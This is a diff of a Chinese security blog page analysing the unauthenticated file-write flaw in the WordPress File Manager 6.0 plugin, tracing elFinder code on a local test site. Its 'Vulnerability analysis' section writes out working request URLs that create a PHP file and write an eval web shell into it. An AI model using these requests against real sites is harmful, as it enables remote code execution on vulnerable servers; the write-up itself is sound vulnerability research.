@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="ps: 首发在云众可信的sec-in平台：sec-in.com                     环境搭建       利用 phpstudy 搭建 wordpress ，http:&#x2F;&#x2F;wordpress.test&#x2F;wp-admin&#x2F;plugin-install.php  将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="ps: 首发在云众可信的sec-in平台：sec-in.com                     环境搭建        利用 phpstudy 搭建 wordpress ，http:&#x2F;&#x2F;wordpress.test&#x2F;wp-admin&#x2F;plugin-install.php  将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Wordpress file manager插件命令执行">
 <meta property="og:url" content="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Whippet&#39;s Blog">
-<meta property="og:description" content="ps: 首发在云众可信的sec-in平台：sec-in.com                     环境搭建       利用 phpstudy 搭建 wordpress ，http:&#x2F;&#x2F;wordpress.test&#x2F;wp-admin&#x2F;plugin-install.php  将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本">
+<meta property="og:description" content="ps: 首发在云众可信的sec-in平台：sec-in.com                     环境搭建        利用 phpstudy 搭建 wordpress ，http:&#x2F;&#x2F;wordpress.test&#x2F;wp-admin&#x2F;plugin-install.php  将解压一次后的漏洞插件压缩包上传并启用插件。 File Manager插件6.0版本">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909144050.png">
 <meta property="og:image" content="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150021.png">
@@ -33,7 +33,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200914104323.png">
 <meta property="og:image" content="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200914104918.png">
 <meta property="article:published_time" content="2020-09-10T02:50:32.000Z">
-<meta property="article:modified_time" content="2020-10-10T09:33:58.420Z">
+<meta property="article:modified_time" content="2020-10-12T06:08:54.337Z">
 <meta property="article:author" content="whippet">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909144050.png"><title>Wordpress file manager插件命令执行 | Whippet's Blog</title><link ref="canonical" href="http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
@@ -59,64 +59,98 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friendship/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whippet's Blog</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Wordpress file manager插件命令执行</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-09-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-10-10</span></span></div></header><div class="post-body"><p>ps: 首发在云众可信的sec-in平台：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.sec-in.com/article/588">sec-in.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friendship/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whippet's Blog</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Wordpress file manager插件命令执行</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-09-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-10-12</span></span></div></header><div class="post-body"><p>ps: 首发在云众可信的sec-in平台：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.sec-in.com/article/588">sec-in.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 
         <h2 id="环境搭建">
           <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a>环境搭建</h2>
-      <p>利用 phpstudy 搭建 wordpress ，<code>http://wordpress.test/wp-admin/plugin-install.php</code>  将解压一次后的漏洞插件压缩包上传并启用插件。</p>
+      
+<p>利用 phpstudy 搭建 wordpress ，<code>http://wordpress.test/wp-admin/plugin-install.php</code>  将解压一次后的漏洞插件压缩包上传并启用插件。</p>
 <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://wordpress.org/plugins/wp-file-manager/advanced/">File Manager插件6.0版本</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <a id="more"></a>
 
-
         <h2 id="漏洞利用">
           <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>漏洞利用</h2>
-      <blockquote>
+      
+<blockquote>
 <p>这段代码来自 elFinder 项目，这是一个向 Web 应用程序提供文件浏览器 GUI 的框架。这个非常具体的代码仅作为示例，而不能在生产应用程序中直接使用。但是，正如我们所看到的，使用了它，结果是可以执行这部分代码而无需进行身份验证。</p>
 </blockquote>
-<p>在 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.exploit-db.com/">exp-db</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 搜索 elFinder<br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909144050.png"></p>
-<p>下载下来的漏洞利用文件需要修改部分<br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150021.png"></p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150609.png"></p>
+<p>在 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.exploit-db.com/">exp-db</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 搜索 elFinder<br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909144050.png" alt=""></p>
+<p>下载下来的漏洞利用文件需要修改部分<br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150021.png" alt=""></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150609.png" alt=""></p>
 
         <h2 id="漏洞分析">
           <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a>漏洞分析</h2>
-      <p>发送一个这样的 payload 来进行创建文件的操作 <code>http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfile&amp;name=test.php&amp;target=l1_Lw</code></p>
+      
+<p>发送一个这样的 payload 来进行创建文件的操作 <code>http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfile&amp;name=test.php&amp;target=l1_Lw</code></p>
 <p>漏洞触发位置 <code>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p>
-<p>通过创建 elFinderConnector 对象，进而调用 elFinderConnector.run<br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150854.png"></p>
-<p>读取所有的请求参数保存到 <code>$src</code> 中， <code>$cmd</code> 获取 cmd 变量。<br><code>\elFinderConnector::run</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909152145.png"></p>
-<p>接着执行到循环 <code>foreach ($this-&gt;elFinder-&gt;commandArgsList($cmd) as $name =&gt; $req) {</code>  对 <code> $cmd</code> 进行校验<br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909152802.png"></p>
-<p>跟进函数<code>commandArgsList</code><br><code>\elFinder::commandArgsList</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909153814.png"></p>
-<p><code>\elFinder::commandExists</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909153415.png"></p>
-<p>通过判断 <code>$cmd</code> ，在 <strong>$this-&gt;commands[$cmd]</strong> 中发现了可以调用的方法<br><code>\elFinder::$commands</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909153117.png"></p>
-<p>继续执行，发现 <code>$this-&gt;output($this-&gt;elFinder-&gt;exec($cmd, $args));</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909154150.png"></p>
+<p>通过创建 elFinderConnector 对象，进而调用 elFinderConnector.run<br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909150854.png" alt=""></p>
+<p>读取所有的请求参数保存到 <code>$src</code> 中， <code>$cmd</code> 获取 cmd 变量。<br>
+<code>\elFinderConnector::run</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909152145.png" alt=""></p>
+<p>接着执行到循环 <code>foreach ($this-&gt;elFinder-&gt;commandArgsList($cmd) as $name =&gt; $req) {</code>  对 <code> $cmd</code> 进行校验<br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909152802.png" alt=""></p>
+<p>跟进函数<code>commandArgsList</code><br>
+<code>\elFinder::commandArgsList</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909153814.png" alt=""></p>
+<p><code>\elFinder::commandExists</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909153415.png" alt=""></p>
+<p>通过判断 <code>$cmd</code> ，在 <strong>$this-&gt;commands[$cmd]</strong> 中发现了可以调用的方法<br>
+<code>\elFinder::$commands</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909153117.png" alt=""></p>
+<p>继续执行，发现 <code>$this-&gt;output($this-&gt;elFinder-&gt;exec($cmd, $args));</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909154150.png" alt=""></p>
 <p><code>\elFinder::exec</code></p>
-<p>控制 <code>$cmd</code> = makedile 时, 为满足条件继续向下执行，需要传入 <code>$target</code> 或者 <code>$dst</code>。<br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909154534.png"></p>
-<p><code>$this-&gt;volume($dst)</code> 根据传入的 <code>$dst</code> 前缀进行选择  <code>l1_</code> 或者 <code>t1_</code>   我们在后面进行调试时会发现生成文件的位置前缀为所对应的 root 的值 ，所以我们在这里选择 <code>l1_</code><br><code>\elFinder::volume</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909155825.png"></p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909160230.png"></p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909160319.png"></p>
-<p>继续执行到动态调用，通过 <code>$result = $this-&gt;$cmd($args);</code> 调用makefile方法。<br><code>\elFinderVolumeDriver::mkfile</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909165300.png"></p>
+<p>控制 <code>$cmd</code> = makedile 时, 为满足条件继续向下执行，需要传入 <code>$target</code> 或者 <code>$dst</code>。<br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909154534.png" alt=""></p>
+<p><code>$this-&gt;volume($dst)</code> 根据传入的 <code>$dst</code> 前缀进行选择  <code>l1_</code> 或者 <code>t1_</code>   我们在后面进行调试时会发现生成文件的位置前缀为所对应的 root 的值 ，所以我们在这里选择 <code>l1_</code><br>
+<code>\elFinder::volume</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909155825.png" alt=""></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909160230.png" alt=""></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909160319.png" alt=""></p>
+<p>继续执行到动态调用，通过 <code>$result = $this-&gt;$cmd($args);</code> 调用makefile方法。<br>
+<code>\elFinderVolumeDriver::mkfile</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909165300.png" alt=""></p>
 <p><code>$path = $this-&gt;decode($dst);</code></p>
-<p><code>\elFinderVolumeDriver::decode</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909165735.png"><br>decode 函数 先将<code>$hash</code> 的值根据 <code>$this-&gt;id</code> 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 <code>$this-&gt;root</code>  </p>
-<p>返回$path = <code>E:\Tools\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files</code><br>继续回到 mkfile 函数中执行<br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910103759.png"></p>
-<p><code>\elFinderVolumeLocalFileSystem::_mkfile</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910104145.png"></p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909172828.png"></p>
-<p>最后顺利生成文件在  <code>E:\Tools\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\test.php</code><br>对于网站的位置就是 <code>\wp-content\plugins\wp-file-manager\lib\files\test.php</code></p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909173020.png"></p>
+<p><code>\elFinderVolumeDriver::decode</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909165735.png" alt=""><br>
+decode 函数 先将<code>$hash</code> 的值根据 <code>$this-&gt;id</code> 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 <code>$this-&gt;root</code></p>
+<p>返回$path = <code>E:\Tools\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files</code><br>
+继续回到 mkfile 函数中执行<br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910103759.png" alt=""></p>
+<p><code>\elFinderVolumeLocalFileSystem::_mkfile</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910104145.png" alt=""></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909172828.png" alt=""></p>
+<p>最后顺利生成文件在  <code>E:\Tools\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\test.php</code><br>
+对于网站的位置就是 <code>\wp-content\plugins\wp-file-manager\lib\files\test.php</code></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909173020.png" alt=""></p>
 <p>然后再调用 PUT 方法，传值到 mkfile 生成的文件内。</p>
 <p><code>http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=put&amp;target=l1_dGVzdC5waHA=&amp;content=&lt;?php eval($_GET['cmd']);?&gt;</code></p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909175132.png"></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200909175132.png" alt=""></p>
 <p>前一部分不在详述，直接跟到 <code>$result = $this-&gt;$cmd($args);</code> 调用 put 方法</p>
-<p><code>\elFinder::put</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910094843.png"></p>
-<p><code>\elFinderVolumeDriver::putContents</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910095150.png"></p>
-<p><code>\elFinderVolumeDriver::decode</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910101728.png"><br>decode 函数 先将<code>$hash</code> 的值根据 <code>$this-&gt;id</code> 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 <code>$this-&gt;root</code>  最后会返回 $path 的值为<code>E:\Tools\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\test.php</code><br><code>\elFinderVolumeLocalFileSystem::_filePutContents</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910095357.png"></p>
+<p><code>\elFinder::put</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910094843.png" alt=""></p>
+<p><code>\elFinderVolumeDriver::putContents</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910095150.png" alt=""></p>
+<p><code>\elFinderVolumeDriver::decode</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910101728.png" alt=""><br>
+decode 函数 先将<code>$hash</code> 的值根据 <code>$this-&gt;id</code> 进行分割，然后替换字串并进行 base64 解码 然后拼接 所对应的 <code>$this-&gt;root</code>  最后会返回 $path 的值为<code>E:\Tools\phpstudy_pro\WWW\wordpress\wp-content\plugins\wp-file-manager\lib\files\test.php</code><br>
+<code>\elFinderVolumeLocalFileSystem::_filePutContents</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200910095357.png" alt=""></p>
 <p>成功将字符串写入文件中</p>
 <hr>
 <p>成功利用还可以直接利用 <code>upload</code> 方法，上传文件</p>
-<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200914104323.png"></p>
-<p><code>\elFinder::upload</code><br><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200914104918.png"></p>
+<p><img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200914104323.png" alt=""></p>
+<p><code>\elFinder::upload</code><br>
+<img src="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/20200914104918.png" alt=""></p>
 
         <h2 id="参考文章">
           <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a>参考文章</h2>
-      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sAParqCYra47do65806Oww">Wordpress file manager插件任意文件上传</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-WMiSxUPrBIAvhVqROSrSQ">WordPress文件管理器插件0day漏洞解析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+      
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sAParqCYra47do65806Oww">Wordpress file manager插件任意文件上传</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-WMiSxUPrBIAvhVqROSrSQ">WordPress文件管理器插件0day漏洞解析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -135,8 +169,8 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></he
             });
             document.body.appendChild(img);
           });
-      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/09/23/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-13933)/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Apache Shiro 权限绕过漏洞(CVE-2020-13933)</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">Apache Shiro 1.2.4反序列化漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">
